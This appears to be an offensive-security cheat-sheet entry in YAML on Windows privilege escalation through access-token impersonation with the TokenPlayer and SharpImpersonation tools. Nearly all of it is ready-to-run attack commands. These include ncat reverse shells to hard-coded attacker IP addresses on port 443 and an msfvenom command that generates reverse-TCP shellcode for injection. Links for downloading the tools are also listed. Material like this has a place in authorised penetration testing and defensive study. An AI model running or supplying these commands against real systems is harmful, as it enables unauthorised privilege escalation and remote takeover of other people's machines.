---
functions:
  privilege-escalation:
    - description: TokenPlayer - Impersonate another user and spawn processes with those user tokens
      code: |
        # reverse shell
        ./TokenPlayer-v0.8.exe --pid 2156 --exec --prog C:\\Windows\\System32\\cmd.exe --args "/c C:\Windows\temp\ncat.exe 192.168.119.135 443 -e cmd.exe"

    - description: SharpImpersonation - Impersonate another user and spawn processes with those user tokens
      code: |
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.127 LPORT=443 -f base64
        SharpImpersonation.exe user:<user> shellcode:<base64shellcode>

        SharpImpersonation.exe user:<user> binary:<binary-Path>
        SharpImpersonation.exe user:xor\david binary:"ncat.exe 192.168.119.127 443 -e cmd.exe"

resources : |
  https://github.com/unkn0wnsyst3m/scripts/blob/master/TokenPlayerx64.exe
  https://github.com/unkn0wnsyst3m/scripts/blob/master/TokenPlayerx86.exe
  https://github.com/S1ckB0y1337/TokenPlayer
  https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
  https://github.com/S3cur3Th1sSh1t/SharpImpersonation
---

